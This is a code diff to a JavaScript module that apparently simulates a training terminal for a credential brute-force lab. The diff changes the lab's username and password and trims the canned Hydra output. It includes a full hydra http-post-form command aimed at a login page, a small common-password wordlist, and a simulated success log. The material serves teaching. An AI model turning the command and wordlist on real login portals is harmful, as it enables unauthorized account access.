@@ -2,8 +2,8 @@ export const TARGET = {
   host: '10.8.0.22',
   hostname: 'portal.nexora.lab',
   url: 'http://10.8.0.22/login',
-  user: 'admin',
-  pass: 'summer2024',
+  user: 'bisha',
+  pass: 'bisha',
 }
 
 export const COMMANDS = {
@@ -16,11 +16,11 @@ export const COMMANDS = {
     '  cat wordlist.txt     show password list',
     '  nmap 10.8.0.22       scan the training target',
     '  curl http://10.8.0.22/login',
-    '  hydra -l admin -P wordlist.txt 10.8.0.22 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"',
+    '  hydra -l bisha -P wordlist.txt 10.8.0.22 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"',
     '  cat flag.txt         read the session flag after Hydra',
     '  clear                clear the terminal',
   ],
-  whoami: ['kali'],
+  whoami: ['bisha'],
   pwd: ['/home/kali'],
   ls: [
     'Desktop  Documents  Downloads  wordlist.txt  flag.txt',
@@ -30,7 +30,7 @@ export const COMMANDS = {
     'password',
     'letmein',
     'qwerty',
-    'summer2024',
+    'bisha',
     'nexora',
     'welcome1',
   ],
@@ -59,14 +59,10 @@ export const COMMANDS = {
     '<!-- error fragment: Invalid credentials -->',
   ],
   hydra: [
-    'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).',
-    '',
-    'Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at lab-time',
-    '[DATA] max 16 tasks per 1 server, overall 16 tasks, 7 login tries (l:1/p:7), ~1 try per task',
+    'Hydra v9.5 starting at lab-time',
     '[DATA] attacking http-post-form://10.8.0.22:80/login:username=^USER^&password=^PASS^:Invalid',
-    '[80][http-post-form] host: 10.8.0.22   login: admin   password: summer2024',
+    '[80][http-post-form] host: 10.8.0.22   login: bisha   password: bisha',
     '1 of 1 target successfully completed, 1 valid password found',
-    '[WARNING] Writing restore file because 1 final worker threads did not complete until end.',
     '[STATS] hydra finished',
   ],
 }
